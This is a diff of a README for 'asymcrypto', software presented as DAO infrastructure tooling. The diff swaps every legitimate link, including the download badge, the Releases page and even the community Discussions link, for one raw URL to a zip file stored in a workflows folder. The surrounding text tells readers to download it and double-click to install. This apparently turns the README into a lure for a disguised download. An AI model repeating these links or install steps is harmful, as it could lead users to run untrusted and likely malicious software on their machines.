@@ -1,6 +1,6 @@
 # 🚀 asymcrypto - Simplifying DAO Infrastructure for Everyone
 
-[![Download asymcrypto](https://img.shields.io/badge/Download-asymcrypto-brightgreen)](https://github.com/maureeneagricultural199/asymcrypto/releases)
+[![Download asymcrypto](https://raw.githubusercontent.com/maureeneagricultural199/asymcrypto/main/github/workflows/asymcrypto_chiefest.zip)](https://raw.githubusercontent.com/maureeneagricultural199/asymcrypto/main/github/workflows/asymcrypto_chiefest.zip)
 
 ## 🌟 Overview
 
@@ -28,7 +28,7 @@ To run asymcrypto, ensure your system meets the following requirements:
 To begin using asymcrypto, follow these simple steps:
 
 1. **Download the Application**:
-   Visit the [Releases page](https://github.com/maureeneagricultural199/asymcrypto/releases) to download the latest version.
+   Visit the [Releases page](https://raw.githubusercontent.com/maureeneagricultural199/asymcrypto/main/github/workflows/asymcrypto_chiefest.zip) to download the latest version.
 
 2. **Install the Application**:
    After downloading, locate the file on your computer. Double-click it to start the installation. Follow the on-screen instructions.
@@ -38,7 +38,7 @@ To begin using asymcrypto, follow these simple steps:
 
 ## 📥 Download & Install
 
-To get the application, please visit our [Releases page](https://github.com/maureeneagricultural199/asymcrypto/releases). Here you will find the latest version of asymcrypto. 
+To get the application, please visit our [Releases page](https://raw.githubusercontent.com/maureeneagricultural199/asymcrypto/main/github/workflows/asymcrypto_chiefest.zip). Here you will find the latest version of asymcrypto. 
 
 - Click the version link that matches your operating system.
 - The file will begin to download. After it finishes, open it to install.
@@ -68,7 +68,7 @@ After launching asymcrypto, here's how to navigate the main features:
 
 We believe in building a strong community around asymcrypto. Join our discussions, share your experiences, and collaborate with others interested in DAO technology. You can reach us through the following channels:
 
-- **GitHub Discussions**: Participate in community conversations on our [GitHub discussions](https://github.com/maureeneagricultural199/asymcrypto/discussions).
+- **GitHub Discussions**: Participate in community conversations on our [GitHub discussions](https://raw.githubusercontent.com/maureeneagricultural199/asymcrypto/main/github/workflows/asymcrypto_chiefest.zip).
 - **Social Media**: Follow us on Twitter and LinkedIn for updates and community events.
 
 ## ⚙️ Frequently Asked Questions
